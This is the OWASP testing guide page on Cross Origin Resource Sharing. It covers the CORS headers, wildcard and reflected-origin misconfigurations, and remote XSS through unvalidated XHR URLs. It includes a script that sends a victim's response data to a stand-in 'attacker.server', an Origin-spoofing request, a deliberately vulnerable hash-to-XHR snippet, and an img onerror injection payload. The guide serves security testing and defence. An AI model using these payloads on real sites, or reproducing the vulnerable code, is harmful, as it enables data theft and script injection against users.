# Testing Cross Origin Resource Sharing

|ID          |
|------------|
|WSTG-CLNT-07|

## Summary

[Cross Origin Resource Sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) (CORS) is a mechanism that enables a web browser to perform cross-domain requests using the XMLHttpRequest (XHR) Level 2 (L2) API in a controlled manner. In the past, the XHR L1 API only allowed requests to be sent within the same origin as it was restricted by the [Same Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) (SOP).

Cross-origin requests have an `Origin` header that identifies the domain initiating the request and is always sent to the server. CORS defines the protocol to use between a web browser and a server to determine whether a cross-origin request is allowed. HTTP [headers](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers) are used to accomplish this.

The [W3C CORS specification](https://www.w3.org/TR/cors/) mandates that for non simple requests, such as requests other than GET or POST or requests that uses credentials, a pre-flight OPTIONS request must be sent in advance to check if the type of request will have a bad impact on the data. The pre-flight request checks the methods and headers allowed by the server, and if credentials are permitted. Based on the result of the OPTIONS request, the browser decides whether the request is allowed or not.

### Origin & Access-Control-Allow-Origin

The `Origin` request header is always sent by the browser in a CORS request and indicates the origin of the request. The Origin header cannot be changed from JavaScript as [the browser (the user-agent) blocks its modification](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name); however, relying on this header for Access Control checks is not a good idea as it may be spoofed outside the browser, for example by using a proxy, so you still need to check that application-level protocols are used to protect sensitive data.

`Access-Control-Allow-Origin` is a response header used by a server to indicate which domains are allowed to read the response. Based on the CORS W3 Specification it is up to the client to determine and enforce the restriction of whether the client has access to the response data based on this header.

From a security testing perspective you should look for insecure configurations as for example using a `*` wildcard as value of the `Access-Control-Allow-Origin` header that means all domains are allowed. Another insecure example is when the server returns back the origin header without any additional checks, which can lead to access of sensitive data. Note that the configuration of allowing cross-origin requests is very insecure and is not acceptable in general terms, except in the case of a public API that is intended to be accessible by everyone.

### Access-Control-Request-Method & Access-Control-Allow-Method

The `Access-Control-Request-Method` header is used when a browser performs a preflight OPTIONS request and lets the client indicate the request method of the final request. On the other hand, the `Access-Control-Allow-Method` is a response header used by the server to describe the methods the clients are allowed to use.

### Access-Control-Request-Headers & Access-Control-Allow-Headers

These two headers are used between the browser and the server to determine which headers can be used to perform a cross-origin request.

### Access-Control-Allow-Credentials

This response header allows browsers to read the response when credentials are passed. When the header is sent, the web application must set an origin to the value of the `Access-Control-Allow-Origin` header. The `Access-Control-Allow-Credentials` header cannot be used along with the `Access-Control-Allow-Origin` header whose value is the `*` wildcard like the following:

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### Input Validation

XHR L2 introduces the possibility of creating a cross-domain request using the XHR API for backwards compatibility. This can introduce security vulnerabilities that in XHR L1 were not present. Interesting points of the code to exploit would be URLs that are passed to XMLHttpRequest without validation, specially if absolute URLs are allowed because that could lead to code injection. Likewise, other part of the application that can be exploited is if the response data is not escaped and we can control it by providing user-supplied input.

### Other Headers

There are other headers involved like `Access-Control-Max-Age` that determines the time a preflight request can be cached in the browser, or `Access-Control-Expose-Headers` that indicates which headers are safe to expose to the API of a CORS API specification.

To review CORS headers, refer to the [CORS MDN document](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers).

## Test Objectives

- Identify endpoints that implement CORS.
- Ensure that the CORS configuration is secure or harmless.

## How to Test

A tool such as [ZAP](https://www.zaproxy.org) can enable testers to intercept HTTP headers, which can reveal how CORS is used. Testers should pay particular attention to the origin header to learn which domains are allowed. Also, in some cases, manual inspection of the JavaScript is needed to determine whether the code is vulnerable to code injection due to improper handling of user supplied input.

### CORS Misconfiguration

Setting the wildcard to the `Access-Control-Allow-Origin header` (that is, `Access-Control-Allow-Origin: *`) is not secure if the response contains sensitive information. Although it cannot be used with the `Access-Control-Allow-Credentials: true` at the same time, it can be dangerous where the access control is done solely by the firewall rules or the source IP addresses, other than being protected by credentials.

#### Wildcard Access-Control-Allow-Origin

A tester can check if the `Access-Control-Allow-Origin: *` exists in the HTTP response messages.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

If a response contains sensitive data, an attacker can steal it through the usage of XHR:

```html
<html>
    <head></head>
    <body>
        <script>
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var xhr2 = new XMLHttpRequest();
                    // attacker.server: attacker listener to steal response
                    xhr2.open("POST", "http://attacker.server", true);
                    xhr2.send(xhr.responseText);
                }
            };
            // victim.site: vulnerable server with `Access-Control-Allow-Origin: *` header 
            xhr.open("GET", "http://victim.site", true);
            xhr.send();
        </script>
    </body>
</html>
```

#### Dynamic CORS Policy

A modern web application or API may be implemented to allow cross-origin requests dynamically, generally in order to allow the requests from the sub domains like the following:

```php
if (preg_match('|\.example.com$|', $_SERVER['SERVER_NAME'])) {
   header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
   ...
}
```

In this example, all the requests from the subdomains of example.com will be allowed. It must be ensured that the regular expression that is used to match is complete. Otherwise, if it was simply matched with `example.com` (without `$` appended), attackers might be able to bypass the CORS policy by appending their domain to the `Origin` header.

```http
GET /test.php HTTP/1.1
Host: example.com
[...]
Origin: http://example.com.attacker.com
Cookie: <session cookie>
```

When the request above is sent, if the following response is returned with the `Access-Control-Allow-Origin` whose value is the same as the attacker's input, the attacker can read the response afterwards and access sensitive information that is only accessible by a victim user.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: http://example.com.attacker.com
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

### Input Validation Weakness

The CORS concept can be viewed from a completely different angle. An attacker may allow their CORS policy on purpose to inject code to the target web application.

#### Remote XSS with CORS

This code makes a request to the resource passed after the `#` character in the URL, initially used to get resources in the same server.

Vulnerable code:

```html
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if(req.readyState==4 && req.status==200) {
            document.getElementById("div1").innerHTML=req.responseText;
        }
    }

    var resource = location.hash.substring(1);
    req.open("GET",resource,true);
    req.send();
</script>

<body>
    <div id="div1"></div>
</body>
```

For example, a request like this will show the contents of the `profile.php` file:

`http://example.foo/main.php#profile.php`

Request and response generated by `http://example.foo/profile.php`:

```html
GET /profile.php HTTP/1.1
Host: example.foo
[...]
Referer: http://example.foo/main.php
Connection: keep-alive

HTTP/1.1 200 OK
[...]
Content-Length: 25
Content-Type: text/html

[Response Body]
```

Now, as there is no URL validation we can inject a remote script, that will be injected and executed in the context of the `example.foo` domain, with a URL like this:

```text
http://example.foo/main.php#http://attacker.bar/file.php
```

Request and response generated by `http://attacker.bar/file.php`:

```html
GET /file.php HTTP/1.1
Host: attacker.bar
[...]
Referer: http://example.foo/main.php
origin: http://example.foo

HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 92
Content-Type: text/html

Injected Content from attacker.bar <img src="#" onerror="alert('Domain: '+document.domain)">
```

## References

- [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
- [MDN Cross-Origin Resources Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
